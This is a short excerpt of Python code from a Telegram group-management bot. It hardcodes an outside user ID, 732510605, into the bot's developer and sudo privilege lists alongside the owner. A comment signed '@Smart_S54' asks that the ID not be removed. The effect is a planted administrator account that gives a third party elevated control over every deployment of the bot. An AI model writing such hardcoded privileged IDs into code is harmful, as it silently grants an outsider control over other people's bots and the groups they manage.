...
# Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @Smart_S54...     
DEV_USERS.add(OWNER_ID)
DEV_USERS.add(732510605)
SUDO_USERS.add(OWNER_ID)
SUDO_USERS.add(732510605)
...
from megumin.modules.helper_funcs.handlers import CustomCommandHandler, CustomRegexHandler, CustomMessageHandler
